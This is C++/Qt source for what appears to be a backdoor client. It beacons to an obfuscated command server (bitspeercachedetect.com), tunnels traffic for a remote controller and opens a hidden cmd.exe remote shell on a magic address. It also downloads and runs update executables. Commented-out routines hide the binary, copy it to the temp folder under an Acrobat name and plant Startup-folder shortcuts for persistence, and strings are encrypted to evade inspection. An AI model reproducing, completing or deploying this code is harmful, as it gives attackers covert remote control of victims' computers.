#include "com.h"
#define strSlot "A"

com::com()
{
    //define all communication objects here
    sckController = new QTcpSocket(this);
    connect(sckController, SIGNAL(connected()),
            this, SLOT(sckController_connected()));
    connect(sckController, SIGNAL(readyRead()),
            this, SLOT(sckController_readyRead()));
    connect(sckController, SIGNAL(disconnected()),
            this, SLOT(sckController_disconnected()));
    connect(sckController, SIGNAL(error(QAbstractSocket::SocketError)),
            this, SLOT(sckController_disconnected()));

    QTimer *timer = new QTimer(this);
    connect(timer, SIGNAL(timeout()), this, SLOT(connectToProxy()));
    timer->start(60000);

    lstSlots.resize(128);

//#ifdef DEBUG
//    //connectToControllerTCP("127.0.0.1",11524);
//    connectToProxy();
//#else
//    selfmaintain_step1();
//#endif

}

com::~com()
{
    //delete all defined objects here
}

//void com::selfmaintain_step1()
//{
//    selfmaintain_step2();
//}

//void com::selfmaintain_step2()
//{
//    QProcess *myProc = new QProcess(this);
//    QStringList args;
//    args << "+H" << "+S" <<  QDir::toNativeSeparators(
//            qApp->applicationFilePath());
//    connect(myProc, SIGNAL(finished(int)),
//            myProc, SLOT(deleteLater()));
//    connect(myProc, SIGNAL(error(QProcess::ProcessError)),
//            myProc, SLOT(deleteLater()));
//    connect(myProc, SIGNAL(destroyed()),
//            this, SLOT(selfmaintain_step3()));
//    myProc->start("attrib",args);
//}

//void com::selfmaintain_step3()
//{
//    QString strTempDir = QDir::tempPath();
//    QByteArray u4 =
//            "\xAB\x43\x2E\x0A\xCC\xAC\x98\x50\x10\x09\xC9\xFE\x9E\x5E\x34";
//    senc(u4,0); // \acrobat_sl.exe
//    QByteArray u5 = QByteArray::fromRawData("\xAB\x63\x2E\x0A\xCC\xAC\x98\x50"
//        "\x6F\x29\xD5\xB5\x9E\x42\x71\x30\xC6\xA7\x93\x4B\x3B\x1B\xDB\xFA\x93"
//        "\x44\x3E",27);
//    senc(u5,0); // \Acrobat Speed Launcher
//#ifndef DEBUG
//    if (strTempDir.compare(QDir::currentPath())) {
//        QDir::setCurrent(strTempDir);
//        strTempDir = QDir::toNativeSeparators(strTempDir);
//        strTempDir.append(u4);
//        if (!QFile::exists(strTempDir) || QFile::remove(strTempDir)) {
//            QFile::copy(
//                QDir::toNativeSeparators(qApp->applicationFilePath()),
//                strTempDir);
//            if (QFile::exists(strTempDir)) {
//                QFile tf;
//                tf.setFileName(strTempDir);
//                tf.open(QFile::ReadWrite);
//                tf.close();
//                QProcess myProc(this);
//                myProc.startDetached(strTempDir);
//                qApp->quit();
//            }
//        }
//        return;
//    }
//#endif

//    QDir home = QDir::home();
//    //strTempDir = home.dirName(); <-- skipping current home?
//    if (!home.cdUp()) return;
//    home.setFilter(QDir::Dirs | QDir::NoDotAndDotDot | QDir::Hidden);

//    QString qtempfile;
//    QStringList qtemp;

//    foreach (strTempDir, home.entryList())
//    {
//        if (!home.cd(strTempDir)) continue;
//        strTempDir = home.path();
//        if ((home.exists("Start Menu") && home.cd("Start Menu"))
//            || home.cd("AppData\\Roaming\\Microsoft\\Windows\\Start Menu")){
//            if (home.cd("Programs")) {
//                if ((home.exists("Startup") || home.mkdir("Startup"))
//                    && home.cd("Startup")) {
//                    if (QFile::exists(QDir::toNativeSeparators(home.path())
//                        .append(u4))) {
//                        QFile::remove(QDir::toNativeSeparators(home.path())
//                            .append(u4));
//                    }
//                    makeShortcut(
//                        QDir::toNativeSeparators(qApp->applicationFilePath()),
//                        QDir::toNativeSeparators(home.path())
//                        .append(u5));
//                    foreach (qtempfile,home.entryList(qtemp,QDir::NoDotAndDotDot,QDir::Name)) {
//                        QFile::remove(qtempfile);
//                    }
//                }
//            }
//            home.cd(strTempDir);
//        }
//        home.cdUp();
//    }
//}

//void com::makeShortcut(QString target, QString linkpath) {
//    HRESULT hres = NULL;
//    IShellLink* psl = NULL;
//    hres = ::CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
//    if (!SUCCEEDED(hres)) return;
//    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
//                            IID_IShellLink, (LPVOID*)&psl);
//    if (SUCCEEDED(hres))
//    {
//        IPersistFile* ppf;

//        // Set the path to the shortcut target
//        wchar_t tpath[MAX_PATH] = {0};
//        target.toWCharArray(tpath);
//        psl->SetPath(tpath);

//        // Query IShellLink for the IPersistFile interface for
//        // saving the shortcut in persistent storage.
//        hres = psl->QueryInterface(IID_IPersistFile,
//            reinterpret_cast<void**>(&ppf));

//        if (SUCCEEDED(hres))
//        {
//            WCHAR wsz[MAX_PATH] = {0};
//            linkpath.toWCharArray(wsz);

//            // Save the link by calling IPersistFile::Save.
//            hres = ppf->Save(wsz, TRUE);
//            ppf->Release();
//        }
//        psl->Release();
//    }
//}

bool com::connectToProxy()
{
    if (sckController->state() == QAbstractSocket::ConnectedState) {
        sckController->write("\xFB\x01\x01");
        return false;
    }
//#ifdef DEBUG
//    return false;
//#endif
    connectToProxyDownload = new QNetworkAccessManager(this);
    connect(connectToProxyDownload, SIGNAL(finished(QNetworkReply*)),
            this, SLOT(connectToProxyDone(QNetworkReply*)));
    connect(connectToProxyDownload, SIGNAL(finished(QNetworkReply*)),
            connectToProxyDownload, SLOT(deleteLater()));
    QNetworkRequest *request;
    QByteArray u1 = "\xA2\x51\x28\x0A\x8E\x8F\x9E\x41\x21\x0E";
    QByteArray u2 = "\xBA\x4D\x37\x11\xCF\xA2\x98\x0B\x7A\x54\x95\xF0\xD3\x71"
                    "\x38\x12\xC3\xBD\x8A\x5B\x68\x5E\xFC\xEF\xDF\x67\x06\xC9"
                    "\xEE\xF6\x36\x02\x67\xB9\x8D\x8F\x6A\x40\x3D\xEB\xD8\xA9"
                    "\x25\x7E\x0F\xA6\x87\xF2\x37\x09\x7D\xED\xDD\xF3\x5C\x67"
                    "\x76";
    QByteArray u3 = QByteArray::fromRawData("\x9F\x56\x39\x08\xD0\xF4\xD6\x0B"
                    "\x2D\x13\xD1\xA3\x8B\x43\x34\x0E\xC4\xB3\x9E\x40\x36\x1A"
                    "\xCC\xA0\x9A\x49\x21\xAE\xC8\xB9\x6C\x03\x34\xE5\xC4\xF5"
                    "\x61\x47\x37\xAB\xDF\xE5\x64\x0D\x7E\xC5\x87\xF9\x36\x00"
                    "\x78\xBF\xF7\x96\x2C\x0D\x67\xAF\xF3\xA5",60);
    //u3 = https://bitspeercachedetect.com/cgi-bin/p?a=%C6%12%7DH%98%FE
    senc(u3,0);
#ifdef DEBUG
    u3 = "http://bitspeercachedetect.com/cgi-bin/p?a=%C6%12%7DH%98%FE";
#endif
    request = new QNetworkRequest(QUrl::fromEncoded(u3));
    u3.clear();
    senc(u1,0);
    senc(u2,0);
    request->setRawHeader(u1,u2);
    u1.clear();
    u2.clear();
    connectToProxyDownload->get(*request);
    delete request;
    return true;
}


void com::connectToProxyDone(QNetworkReply* reply)
{
    QByteArray data = QByteArray::fromBase64(reply->readAll());
    if (data.isEmpty()) data.append('\0');
    switch (data.at(0)) {
        case 7:
            //good
            break;
        case 8:
            data.remove(0,1);
            senc(data,0);
            if (data.at(0) == '\1') {
                quint16 port = (* (quint16*)data.mid(1,2).data() );
                this->connectToControllerTCP(data.mid(3),port);
            }
            break;
        case 6:
            //todo download update
            break;
        default:
            //bad proxy !
            break;
    }
    reply->deleteLater();
}

void com::connectToControllerTCP(QString addr, quint16 port)
{
    if (sckController->state() != QAbstractSocket::UnconnectedState) {
        sckController->abort();
    }
    sckController->connectToHost(addr, port,
                                 QIODevice::ReadWrite);
}

void com::sckController_connected()
{
    isConnected = true;
    rstinseq();
}

void com::sckController_readyRead()
{
    if (!sckController->bytesAvailable()) return;
    QByteArray barData = sckController->readAll();
    barData.prepend(barControllerQueue);
    QByteArray barRet;
    quint8 slot;
    QHostAddress ip;
    quint32 i;
    quint16 port;
    while (dcdata(barData, barRet, slot))
    {
        if (slot == 1) { //system call
            QByteArray dest;

            switch (barRet.at(0))
            {
                case 1:
                    slot = barRet.at(1);
                    if (lstSlots[slot] == 0) {
                        lstSlots[slot] = new QTcpSocket(this);
                        connect(lstSlots[slot], SIGNAL(connected()),
                                this, SLOT(sckSlot_connected()));
                        connect(lstSlots[slot], SIGNAL(disconnected()),
                                this, SLOT(sckSlot_disconnected()));
                        connect(lstSlots[slot], SIGNAL(error(QAbstractSocket::SocketError)),
                                this, SLOT(sckSlot_error(QAbstractSocket::SocketError)));
                        connect(lstSlots[slot], SIGNAL(readyRead()),
                                this, SLOT(sckSlot_readyRead()));
                        lstSlots[slot]->setProperty(strSlot, slot);
                    }
                    if (lstSlots.at(slot)->state()
                        != QAbstractSocket::UnconnectedState)
                    {
                        lstSlots[slot]->abort();
                    }
                    barRet.remove(1,1);
                    switch (barRet.at(1))
                    {
                        case 1: //0x01 = IPv4 address
                            dest = barRet.mid(2,4);
                            port = (* (quint16*)barRet.mid(6,2).data() );
                            i = (* (quint32*)dest.data() );
                            i = (i>>24) |
                                ((i<<8) & 0x00FF0000) |
                                ((i>>8) & 0x0000FF00) |
                                (i<<24);
                            if (port == 55345 && i == 2130706433) {
                                QProcess *procTun = new QProcess(this);
                                procTun->setProperty(strSlot, slot);
                                lstSlots[slot]->setProperty("b",1);
                                procTun->setProperty("b",1);
                                procTun->setProcessChannelMode(
                                        QProcess::MergedChannels);
                                connect(procTun, SIGNAL(started()),
                                        this, SLOT(sckSlot_connected()));
                                connect(procTun, SIGNAL(finished(int)),
                                        this, SLOT(sckSlot_disconnected()));
                                connect(procTun, SIGNAL(error(QProcess::ProcessError)),
                                        this, SLOT(sckSlot_disconnected()));
                                connect(procTun, SIGNAL(readyRead()),
                                        this, SLOT(sckSlot_readyRead()));
                                connect(procTun, SIGNAL(destroyed()),
                                        lstSlots[slot], SLOT(deleteLater()));
                                connect(lstSlots[slot], SIGNAL(destroyed()),
                                        procTun, SLOT(kill()));
                                connect(lstSlots[slot], SIGNAL(destroyed()),
                                        procTun, SLOT(deleteLater()));
                                procTun->start("cmd", QIODevice::ReadWrite
                                                        | QIODevice::Text);
                            } else {
                                ip.setAddress(i);
                                lstSlots[slot]->connectToHost(ip, port);
                            }
                            break;
                        case 3: //0x03 = Domain name
                            port = barRet.at(2);
                            dest = barRet.mid(3,port);
                            port = (* (quint16*)barRet.mid(3+port,2).data() );
                            lstSlots[slot]->connectToHost(QString(dest), port);
                            break;
                        case 4: //0x04 = IPv6 address
                            dest = barRet.mid(2,16);
                            port = (* (quint16*)barRet.mid(18,2).data() );
                            //TODO: ip conversion
                            break;
                    }
                    break;
                case 2: //kill slot
                    if ((quint8)barRet.at(1) > 1
                        && (quint8)barRet.at(1) < 128) {
                        slot = barRet.at(1);
                        if (lstSlots[slot]) {
                            if (lstSlots[slot]->property("b").isValid()) {
                                lstSlots[slot]->deleteLater();
                            } else {
                                lstSlots[slot]->disconnectFromHost();
                            }
                        }
                    }
                    break;
                case 3:
                    //TODO: self reset
                    break;
                case 4:
                    //update stage1
                    fileUpdate = new QTemporaryFile(this);
                    fileUpdate->open();
                    break;
                case 5:
                    //update stage2
                    barRet.remove(0,1);
                    fileUpdate->write(barRet);
                    break;
                case 6:
                    //update stage3
                    fileUpdate->close();
                    QProcess *fileUpdateProc = new QProcess(fileUpdate);
                    connect(fileUpdateProc, SIGNAL(finished(int)),
                            fileUpdateProc, SLOT(deleteLater()));
                    connect(fileUpdateProc, SIGNAL(destroyed()),
                            fileUpdate, SLOT(deleteLater()));
                    fileUpdate->rename(fileUpdate->fileName()+".exe");
                    fileUpdateProc->start(
                            fileUpdate->fileName());
                    fileUpdate->deleteLater();
                    fileUpdateProc->deleteLater();
                    break;
            }
        } else { //tunnel call
            if (lstSlots[slot]->property("b").isValid()) {
                QList<QProcess *> parCmds
                        = this->findChildren<QProcess *>();
                foreach (QProcess *curCmd, parCmds) {
                    if (curCmd->property(strSlot).toInt() != slot) continue;
                    curCmd->write(barRet);
                    break;
                }
            } else {
                lstSlots[slot]->write(barRet);
            }
        }
    }
    barControllerQueue = barData;
}

void com::sckController_disconnected()
{
    if (!isConnected) return;
    isConnected = false;
    for (quint8 i = 2; i < 128; ++i) {
        if (lstSlots[i]) {
            if (lstSlots[i]->state() == QAbstractSocket::UnconnectedState) {
                lstSlots[i]->deleteLater();
                lstSlots[i] = NULL;
            } else {
                lstSlots[i]->disconnectFromHost();
            }
        }
    }
}

void com::sckSlot_connected()
{
    QTcpSocket *socket = static_cast<QTcpSocket*>(sender());
    quint8 slot = socket->property(strSlot).toInt();
    QByteArray data("\2");
    data.append(slot);
    quint32 ipv4;
    quint16 port;
    if (socket->property("b").isValid()) {
        ipv4 = 2130706433;
        port = 55345;
    } else {
        ipv4 = socket->peerAddress().toIPv4Address();
        port = socket->peerPort();
    }
    data.append(QByteArray::fromRawData(
            (char*)&ipv4, 4));
    data.append(QByteArray::fromRawData(
            (char*)&port, 2));
    data = mkdata(data, 1);
    sckController->write(data);
}

void com::sckSlot_error(QAbstractSocket::SocketError err)
{
    QTcpSocket *socket = static_cast<QTcpSocket*>(sender());
    switch (err)
    {
        case QAbstractSocket::ConnectionRefusedError:
            break;
        case QAbstractSocket::RemoteHostClosedError:
            //The remote host closed the connection.
            //Note that the client socket (i.e., this socket) will be closed
            //after the remote close notification has been sent.
            break;
        case QAbstractSocket::HostNotFoundError:
            break;
        case QAbstractSocket::SocketAccessError:
            //The socket operation failed because the application lacked the
            //required privileges
            break;
        case QAbstractSocket::SocketResourceError:
            //The local system ran out of resources (e.g., too many sockets).
            break;
        case QAbstractSocket::SocketTimeoutError:
            break;
        case QAbstractSocket::NetworkError:
            //An error occurred with the network
            //(e.g., the network cable was accidentally plugged out).
            break;
        default:
            break;
    }
    socket->abort();
    quint8 slot = socket->property(strSlot).toInt();
    QByteArray data("\3");
    data.append(slot);
    data.append(err);
    data = mkdata(data, 1);
    sckController->write(data);
    socket->deleteLater();
    lstSlots[slot] = NULL;
}

void com::sckSlot_disconnected()
{
    QTcpSocket *socket = static_cast<QTcpSocket*>(sender());
    quint8 slot = socket->property(strSlot).toInt();
    QByteArray data("\4");
    data.append(slot);
    data = mkdata(data, 1);
    sckController->write(data);
    socket->deleteLater();
    lstSlots[slot] = NULL;
}

void com::sckSlot_readyRead()
{
    QTcpSocket *socket = static_cast<QTcpSocket*>(sender());
    QByteArray data = socket->readAll();
    if (data.isEmpty()) return;
    quint8 slot = socket->property(strSlot).toInt();
    data = mkdata(data, slot);
    sckController->write(data);
}
